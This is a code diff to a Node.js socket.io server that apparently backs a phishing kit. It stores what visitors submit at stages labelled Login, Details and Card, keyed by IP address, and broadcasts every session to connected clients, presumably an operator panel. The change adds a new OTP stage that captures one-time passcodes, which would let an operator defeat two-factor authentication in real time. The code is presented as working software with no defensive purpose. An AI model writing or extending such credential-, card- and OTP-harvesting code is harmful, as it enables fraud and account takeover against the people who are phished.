@@ -259,10 +259,11 @@ io.on('connection', (socket, req) => {
     socket.on('submit', (data) => {
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
-            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard) {
+            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP) {
             userDetails.getUserDataLogin = {};
                 userDetails.getUserDataDetails = {};
                 userDetails.getUserDataCard = {};
+                userDetails.getUserDataOTP = {};
         }
         if(userDetails.stage == 'Login'){
             userDetails.getUserDataLogin = data
@@ -273,7 +274,10 @@ io.on('connection', (socket, req) => {
         } else if(userDetails.stage == 'Card'){
             userDetails.getUserDataCard = data
             console.log('Card')
-        }
+        } else if(userDetails.stage == 'OTP'){
+            userDetails.getUserDataOTP = data
+            console.log('OTP')
+        } 
             
         sessionStore.set(userIP, userDetails);
         io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
